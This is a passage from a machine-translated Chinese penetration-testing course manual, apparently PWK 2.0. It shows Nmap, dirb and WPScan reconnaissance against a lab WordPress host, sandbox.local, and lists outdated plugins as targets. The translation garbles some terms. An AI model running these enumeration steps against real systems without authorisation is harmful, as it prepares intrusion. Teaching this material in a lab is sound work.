<div style="position:absolute;top:152454;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:152470;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">22/tcp 打开 ssh</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:152487;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ssh 主机密钥：</font></font></font></b></nobr></div>
<div style="position:absolute;top:152504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">2048 86:8f:89:36:79:2f:44:b2:61:18:a4:fb:d5:a1:f3:43 (RSA)</font></font></nobr></div>
<div style="position:absolute;top:152521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">256 de:f3:84:f1:cd:f3:c8:9a:30:6d:60:e8:b1:1d:99:27 (ECDSA)</font></font></nobr></div>
<div style="position:absolute;top:152539;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ 256 14:6a:ba:77:e0:57:e5:0c:c0:cc:76:31:91:8d:dd:9f (ED25519)</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:152555;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80/tcp 打开http</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:152572;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_http 生成器：</font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WordPress 5.3</font></font></font></b></nobr></div>
<div style="position:absolute;top:152589;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_http-title: 沙盒 – </font><font style="vertical-align: inherit;">展望未来，感受光芒</font></font></nobr></div>
<div style="position:absolute;top:152606;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MAC 地址：00:50:56:8A:C8:51 (VMware)</font></font></nobr></div>
<div style="position:absolute;top:152640;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 完成：111.66 秒内扫描 1 个 IP 地址（1 个主机启动）</font></font></nobr></div>
<div style="position:absolute;top:152660;left:328"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 856 - 从初始发现开始的 Nmap 扫描</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:152689;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们回顾一下这次扫描的结果。</font><font style="vertical-align: inherit;">首先，Nmap 扫描仅显示两个开放端口：22 和 80。</font></font></nobr></div>
<div style="position:absolute;top:152708;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 将服务指纹识别为在端口上运行 SSH 服务和 HTTP 服务</font></font></nobr></div>
<div style="position:absolute;top:152728;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分别。</font><font style="vertical-align: inherit;">Nmap 默认插件集还显示了 ssh-hostkeys。</font></font></nobr></div>
<div style="position:absolute;top:152761;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP 服务向我们显示正在运行的应用程序可能是 WordPress 5.3。</font><font style="vertical-align: inherit;">风险</font></font></nobr></div>
<div style="position:absolute;top:152780;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSH 服务公开的信息通常比 HTTP 服务公开的要少得多。</font></font></nobr></div>
<div style="position:absolute;top:152799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因此，HTTP 服务似乎是一个更好的起点来妥协 sandbox.local</font></font></nobr></div>
<div style="position:absolute;top:152819;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">环境。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:152856;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2 以 Web 应用程序为目标</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:152898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们采取的第一步是简单地访问 Web 应用程序主页。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:153427;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="130"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 130 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:153460;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:154537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:154537;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:154537;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">747</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:154062;left:323"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 318：访问 Sandbox.local 网页</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:154094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主页似乎是公司相当标准的登陆页面。</font><font style="vertical-align: inherit;">中的链接</font></font></nobr></div>
<div style="position:absolute;top:154113;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导航栏都指向主页上的锚点，并且有一项调查要求反馈</font></font></nobr></div>
<div style="position:absolute;top:154132;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">左下角。</font><font style="vertical-align: inherit;">用户控制的输入似乎没有其他字段。</font></font></nobr></div>
<div style="position:absolute;top:154165;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 扫描表明该网页在 WordPress 5.3 上运行，但为了确认，</font></font></nobr></div>
<div style="position:absolute;top:154184;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">需要进一步列举。</font></font></nobr></div>
<div style="position:absolute;top:154217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然 WordPress 核心本身存在漏洞，但 WordPress 开发人员是</font></font></nobr></div>
<div style="position:absolute;top:154237;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">快速修补它们。</font><font style="vertical-align: inherit;">然而，主题和插件是由社区编写的，许多</font></font></nobr></div>
<div style="position:absolute;top:154256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞未正确修补或根本从未修复。</font></font></nobr></div>
<div style="position:absolute;top:154289;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这使得 WordPress 成为妥协的绝佳目标。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:154323;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">24.2.1</font></font></i></nobr></div>
<div style="position:absolute;top:154323;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Web 应用程序枚举</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:154361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们开始专门针对 WordPress 之前，让我们做一个基本的目录蛮力来发现</font></font></nobr></div>
<div style="position:absolute;top:154381;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任何潜在的敏感文件，并确认该站点正在运行 WordPress。</font><font style="vertical-align: inherit;">为此，我们将使用</font></font></nobr></div>
<div style="position:absolute;top:154400;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dirb 如下。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:154435;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dirb http://sandbox.local</font></font></font></b></nobr></div>
<div style="position:absolute;top:154454;left:347"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 857 - sandbox.local 的 dirb 扫描 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:154615;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="131"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 131 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:154648;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:155725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:155725;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:155725;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">748</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:154744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然 dirb 有许多我们可以使用的标志和功能，但我们选择运行一个简单的测试。</font></font></nobr></div>
<div style="position:absolute;top:154763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们命令的输出可以在清单 858 中找到。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:154798;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:154815;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- 扫描网址：http://sandbox.local/ ----</font></font></nobr></div>
<div style="position:absolute;top:154832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://sandbox.local/index.php (CODE:301|SIZE:0)</font></font></nobr></div>
<div style="position:absolute;top:154849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://sandbox.local/server-status (CODE:403|SIZE:278)</font></font></nobr></div>
<div style="position:absolute;top:154866;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==&gt;目录：HTTP：//sandbox.local/</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可湿性粉剂管理员/</font></font></font></b></nobr></div>
<div style="position:absolute;top:154883;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==&gt;目录：HTTP：//sandbox.local/</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可湿性粉剂内容/</font></font></font></b></nobr></div>
<div style="position:absolute;top:154900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==&gt; 目录：http://sandbox.local/ </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wp-includes/</font></font></font></b></nobr></div>
<div style="position:absolute;top:154917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://sandbox.local/xmlrpc.php (CODE:405|SIZE:42)</font></font></nobr></div>
<div style="position:absolute;top:154951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- 进入目录：http://sandbox.local/wp-admin/ ----</font></font></nobr></div>
<div style="position:absolute;top:154968;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://sandbox.local/wp-admin/admin.php (CODE:302|SIZE:0)</font></font></nobr></div>
<div style="position:absolute;top:154985;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==&gt; 目录：http://sandbox.local/wp-admin/css/</font></font></nobr></div>
<div style="position:absolute;top:155002;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==&gt; 目录：http://sandbox.local/wp-admin/images/</font></font></nobr></div>
<div style="position:absolute;top:155019;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==&gt; 目录：http://sandbox.local/wp-admin/includes/</font></font></nobr></div>
<div style="position:absolute;top:155035;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://sandbox.local/wp-admin/index.php (CODE:302|SIZE:0)</font></font></nobr></div>
<div style="position:absolute;top:155052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==&gt; 目录：http://sandbox.local/wp-admin/js/</font></font></nobr></div>
<div style="position:absolute;top:155069;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==&gt; 目录：http://sandbox.local/wp-admin/maint/</font></font></nobr></div>
<div style="position:absolute;top:155087;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==&gt; 目录：http://sandbox.local/wp-admin/network/</font></font></nobr></div>
<div style="position:absolute;top:155104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==&gt; 目录：http://sandbox.local/wp-admin/user/</font></font></nobr></div>
<div style="position:absolute;top:155137;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- 进入目录：http://sandbox.local/wp-content/ ----</font></font></nobr></div>
<div style="position:absolute;top:155154;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ http://sandbox.local/wp-content/index.php (CODE:200|SIZE:0)</font></font></nobr></div>
<div style="position:absolute;top:155171;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==&gt; 目录：http://sandbox.local/wp-content/plugins/</font></font></nobr></div>
<div style="position:absolute;top:155188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==&gt; 目录：http://sandbox.local/wp-content/themes/</font></font></nobr></div>
<div style="position:absolute;top:155205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==&gt; 目录：http://sandbox.local/wp-content/upgrade/</font></font></nobr></div>
<div style="position:absolute;top:155222;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">==&gt; 目录：http://sandbox.local/wp-content/uploads/</font></font></nobr></div>
<div style="position:absolute;top:155256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- 进入目录：http://sandbox.local/wp-includes/ ----</font></font></nobr></div>
<div style="position:absolute;top:155273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(!) 警告：目录是可列出的。</font><font style="vertical-align: inherit;">不需要扫描它。    </font></font></nobr></div>
<div style="position:absolute;top:155290;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（如果你想扫描它，请使用模式“-w”）</font></font></nobr></div>
<div style="position:absolute;top:155324;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- 进入目录：http://sandbox.local/wp-admin/css/ ----</font></font></nobr></div>
<div style="position:absolute;top:155341;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(!) 警告：目录是可列出的。</font><font style="vertical-align: inherit;">不需要扫描它。    </font></font></nobr></div>
<div style="position:absolute;top:155358;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（如果你想扫描它，请使用模式“-w”）</font></font></nobr></div>
<div style="position:absolute;top:155375;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:155392;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------------</font></font></nobr></div>
<div style="position:absolute;top:155409;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">END_TIME：2019 年 12 月 9 日星期一 13:00:40</font></font></nobr></div>
<div style="position:absolute;top:155426;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载：32284 - 找到：12</font></font></nobr></div>
<div style="position:absolute;top:155445;left:367"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 858 - dirb 扫描的输出</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:155475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的扫描显示了我们目标上的常见 WordPress 目录（wp-admin、wp-content 和 wp-</font></font></nobr></div>
<div style="position:absolute;top:155494;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">包括）。</font><font style="vertical-align: inherit;">我们还发现了一些可列出的目录；</font><font style="vertical-align: inherit;">然而，这些是常见的 WordPress</font></font></nobr></div>
<div style="position:absolute;top:155513;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">目录，可能不会透露太多。</font></font></nobr></div>
<div style="position:absolute;top:155546;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们继续使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WPScan</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进行更具体的扫描，</font><i><font style="vertical-align: inherit;">WPScan</font></i><font style="vertical-align: inherit;">是一种使用</font></font></nobr></div>
<div style="position:absolute;top:155566;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">已知漏洞的数据库，以发现 WordPress 实例的安全问题。</font></font></nobr></div>
<div style="position:absolute;top:155598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了彻底扫描，我们需要提供目标的 URL ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">–url</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 并配置</font></font></nobr></div>
<div style="position:absolute;top:155618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">枚举选项 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-enumerate</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 以包括“所有插件”( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ap</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )、“所有主题”( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">at</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )、“配置备份”</font></font></nobr></div>
<div style="position:absolute;top:155637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cb</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 和“Db 导出”( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dbe</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )。</font><font style="vertical-align: inherit;">最终命令可以在下面的清单 859 中找到。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:155672;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wpscan --url sandbox.local --enumerate ap,at,cb,dbe</font></font></font></b></nobr></div>
</span></font>

<div style="position:absolute;top:155803;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="132"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 132 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:155836;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:156913;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:156913;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:156913;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">749</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:155932;left:350"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 859 - 运行 wpscan 的命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:155961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">WPScan 输出有关目标的有用信息：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:155996;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...    </font></font></nobr></div>
<div style="position:absolute;top:156013;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[i] 插件已识别：</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:156047;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 元素</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:156064;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">位置：http://sandbox.local/wp-content/plugins/elementor/</font></font></nobr></div>
<div style="position:absolute;top:156081;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">最后更新：2019-12-08T17:19:00.000Z</font></font></nobr></div>
<div style="position:absolute;top:156098;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">[!] 版本过时，最新版本是2.7.6</font></font></nobr></div>
<div style="position:absolute;top:156115;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:156132;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">发现者：主页中的网址（被动检测）</font></font></nobr></div>
<div style="position:absolute;top:156149;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:156166;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">版本：2.7.4（100% 置信度）</font></font></nobr></div>
<div style="position:absolute;top:156182;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">发现者：查询参数（被动检测）</font></font></nobr></div>
<div style="position:absolute;top:156200;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">- http://sandbox.local/wp-content/plugins/elementor/assets/css/frontend.min.css?ve</font></font></nobr></div>
<div style="position:absolute;top:156217;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">r=2.7.4</font></font></nobr></div>
<div style="position:absolute;top:156234;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">- http://sandbox.local/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=</font></font></nobr></div>
<div style="position:absolute;top:156250;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.7.4</font></font></nobr></div>
<div style="position:absolute;top:156267;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">确认者：自述文件 - 稳定标签（积极检测）</font></font></nobr></div>
<div style="position:absolute;top:156284;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">- http://sandbox.local/wp-content/plugins/elementor/readme.txt</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:156319;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 海洋-额外</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:156335;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">位置：http://sandbox.local/wp-content/plugins/ocean-extra/</font></font></nobr></div>
<div style="position:absolute;top:156352;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">最后更新：2019-11-13T16:17:00.000Z</font></font></nobr></div>
<div style="position:absolute;top:156369;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">[!] 版本过时，最新版本是1.5.19</font></font></nobr></div>
<div style="position:absolute;top:156386;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:156403;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">发现者：主页中的网址（被动检测）</font></font></nobr></div>
<div style="position:absolute;top:156420;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:156437;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">版本：1.5.16（100% 置信度）</font></font></nobr></div>
<div style="position:absolute;top:156454;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">发现者：自述文件 - 稳定标签（积极检测）</font></font></nobr></div>
<div style="position:absolute;top:156471;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">- http://sandbox.local/wp-content/plugins/ocean-extra/readme.txt</font></font></nobr></div>
<div style="position:absolute;top:156488;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">确认者：自述文件 - ChangeLog 部分（主动检测）</font></font></nobr></div>
<div style="position:absolute;top:156505;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">- http://sandbox.local/wp-content/plugins/ocean-extra/readme.txt</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:156539;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] wp-调查和民意调查</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:156556;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">位置：http://sandbox.local/wp-content/plugins/wp-survey-and-poll/</font></font></nobr></div>
<div style="position:absolute;top:156573;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">最后更新：2019-10-15T10:32:00.000Z</font></font></nobr></div>
<div style="position:absolute;top:156590;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">[!] 版本过时，最新版本是1.5.8.2</font></font></nobr></div>
<div style="position:absolute;top:156607;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:156624;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">发现者：主页中的网址（被动检测）</font></font></nobr></div>
<div style="position:absolute;top:156641;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|</font></font></nobr></div>
<div style="position:absolute;top:156658;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">版本：1.5.7.3（50% 置信度）</font></font></nobr></div>
